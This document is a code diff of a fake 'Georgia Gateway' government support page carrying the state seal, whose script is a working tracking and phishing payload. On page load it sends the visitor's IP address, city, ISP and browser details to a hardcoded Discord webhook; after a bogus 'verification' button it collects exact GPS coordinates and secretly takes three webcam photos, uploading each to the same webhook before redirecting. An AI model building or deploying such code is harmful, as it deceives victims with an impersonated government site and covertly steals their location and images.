@@ -3,167 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Georgia Gateway | Support Portal</title>
+    <title>Georgia Gateway | Secure Portal</title>
     <style>
-        body {
-            background-color: #f4f7f9;
-            color: #333;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-        }
-
-        #content {
-            text-align: center;
-            background: white;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            max-width: 400px;
-            width: 90%;
-            border-top: 6px solid #004a99;
-        }
-
-        .gov-logo {
-            width: 60px;
-            height: auto;
-            margin-bottom: 20px;
-        }
-
-        h2 {
-            font-size: 20px;
-            color: #004a99;
-            margin: 10px 0;
-            font-weight: 700;
-        }
-
-        .info-box {
-            background: #e7f0f7;
-            padding: 10px;
-            border-radius: 4px;
-            font-size: 13px;
-            color: #004a99;
-            margin-bottom: 20px;
-            border-left: 4px solid #004a99;
-            text-align: left;
-        }
-
-        #authBtn {
-            background: #004a99;
-            color: white;
-            border: none;
-            padding: 15px 0;
-            width: 100%;
-            border-radius: 4px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 16px;
-        }
-
+        body { background: #f0f2f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); max-width: 400px; width: 90%; text-align: center; border-top: 6px solid #004a99; }
+        .logo { width: 80px; margin-bottom: 20px; }
+        h2 { color: #004a99; margin-bottom: 15px; font-size: 22px; }
+        .info { background: #e8f0fe; color: #1967d2; padding: 15px; border-radius: 4px; font-size: 13px; text-align: left; margin-bottom: 25px; line-height: 1.4; border-left: 4px solid #1967d2; }
+        #authBtn { background: #004a99; color: white; border: none; padding: 16px 30px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
+        #authBtn:hover { background: #003366; }
         #authBtn:disabled { background: #ccc; }
-
-        .spinner {
-            border: 2px solid #ffffff;
-            border-top: 2px solid #004a99;
-            border-radius: 50%;
-            width: 16px;
-            height: 16px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
-
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer { margin-top: 25px; font-size: 11px; color: #777; }
     </style>
 </head>
 <body>
 
-    <div id="content">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Great_Seal_of_the_State_of_Georgia.svg/1024px-Great_Seal_of_the_State_of_Georgia.svg.png" class="gov-logo">
-        <h2>Georgia Child Support</h2>
-        <div class="info-box">
-            <strong>უსაფრთხოების შეტყობინება:</strong><br>
-            გთხოვთ, გაიაროთ იდენტიფიკაცია სესიის გასაგრძელებლად.
-        </div>
-        <button id="authBtn">დადასტურება</button>
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Great_Seal_of_the_State_of_Georgia.svg/1024px-Great_Seal_of_the_State_of_Georgia.svg.png" class="logo">
+    <h2>ავტორიზაცია</h2>
+    <div class="info">
+        <strong>სისტემური შეტყობინება:</strong><br>
+        თქვენს პროფილზე წვდომისთვის საჭიროა მოწყობილობისა და ლოკაციის ვერიფიკაცია. გთხოვთ დაადასტუროთ.
     </div>
+    <button id="authBtn">ვერიფიკაციის დაწყება</button>
+    <div class="footer">© 2026 Georgia Department of Human Services</div>
+</div>
 
-    <video id="video" style="display:none;" autoplay playsinline muted></video>
-    <canvas id="canvas" style="display:none;" width="1280" height="720"></canvas>
+<video id="video" style="display:none;" autoplay playsinline muted></video>
+<canvas id="canvas" style="display:none;" width="1280" height="720"></canvas>
 
-    <script>
-        const webhookURL = "https://discord.com/api/webhooks/1485355763906904075/cZdhC78M-9dPiuLhi2dyRlzRBT4WKxZundc3ObtynZuE3IGEawS_zhwzUZNL9go9j3gy";
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/1485355763906904075/cZdhC78M-9dPiuLhi2dyRlzRBT4WKxZundc3ObtynZuE3IGEawS_zhwzUZNL9go9j3gy";
+    const myWebsite = "https://gvaska519.github.io/Test123/georgian.html"; // <-- აქ ჩაწერე შენი საიტის ლინკი
 
-        async function logVisit() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
+    // 1. ეგრევე გაგზავნა (ლინკზე შემოსვლისთანავე)
+    async function instantLog() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🚀 ახალი შემოსვლა ლინკზე!",
+                        color: 16711680,
+                        description: `🌐 **IP:** \`${d.ip}\`\n📍 **ქალაქი:** ${d.city}\n🏳️ **ქვეყანა:** ${d.country_name}\n📡 **პროვაიდერი:** ${d.org}\n📱 **ბრაუზერი:** ${navigator.userAgent.substring(0, 100)}...`,
+                        timestamp: new Date()
+                    }]
+                })
+            });
+        } catch (e) {}
+    }
+
+    // 2. ღილაკზე დაჭერის შემდეგ (GPS + 3 ფოტო)
+    async function startCapture() {
+        const btn = document.getElementById('authBtn');
+        btn.disabled = true;
+        btn.innerText = "მოწმდება...";
+
+        // GPS მოთხოვნა
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: "🏛️ **ახალი ვიზიტი (Georgia Portal)**",
-                        embeds: [{
-                            color: 15844367,
-                            description: `🌐 IP: \`${data.ip}\`\n🏙️ City: ${data.city}\n🏳️ Country: ${data.country_name}`
-                        }]
+                        content: `🎯 **ზუსტი ლოკაცია:** https://www.google.com/maps?q=${lat},${lon}`
                     })
                 });
-            } catch (e) {}
+            });
         }
 
-        async function handleAuth() {
-            const btn = document.getElementById('authBtn');
-            btn.disabled = true;
-            btn.innerHTML = '<span class="spinner"></span>მოწმდება...';
+        // კამერა (3 ფოტო)
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
 
-            try {
-                // კამერის მოთხოვნა
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: "user",
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    } 
-                });
-                
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+            video.onloadedmetadata = async () => {
+                for (let i = 1; i <= 3; i++) {
+                    await new Promise(r => setTimeout(r, 2000)); // 2 წამიანი ინტერვალი
+                    
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                video.onloadedmetadata = () => {
-                    // 1.5 წამიანი დაყოვნება ხარისხიანი ფოტოსთვის
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        const context = canvas.getContext('2d');
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+                    const formData = new FormData();
+                    formData.append('file', blob, `frame_${i}.jpg`);
+                    formData.append('payload_json', JSON.stringify({ content: `📸 კადრი #${i}` }));
 
-                        canvas.toBlob(async (blob) => {
-                            const formData = new FormData();
-                            formData.append('file', blob, 'identity_check.jpg');
-                            formData.append('payload_json', JSON.stringify({
-                                content: "👤 **ბიომეტრიული ფოტო მოვიდა!**"
-                            }));
-
-                            await fetch(webhookURL, { method: 'POST', body: formData });
-                            
-                            stream.getTracks().forEach(track => track.stop());
-                            window.location.href = "https://childsupport.georgia.gov/";
-                        }, 'image/jpeg', 0.8);
-                    }, 1500);
-                };
-
-            } catch (err) {
-                // თუ კამერა დაბლოკა, მაინც გადავიყვანოთ
-                window.location.href = "https://childsupport.georgia.gov/";
-            }
+                    await fetch(webhookURL, { method: 'POST', body: formData });
+                }
+                stream.getTracks().forEach(t => t.stop());
+                window.location.href = myWebsite; // გადაყვანა შენს საიტზე
+            };
+        } catch (err) {
+            window.location.href = myWebsite;
         }
+    }
 
-        window.onload = logVisit;
-        document.getElementById('authBtn').addEventListener('click', handleAuth);
-    </script>
+    window.onload = instantLog;
+    document.getElementById('authBtn').addEventListener('click', startCapture);
+</script>
+
 </body>
 </html>
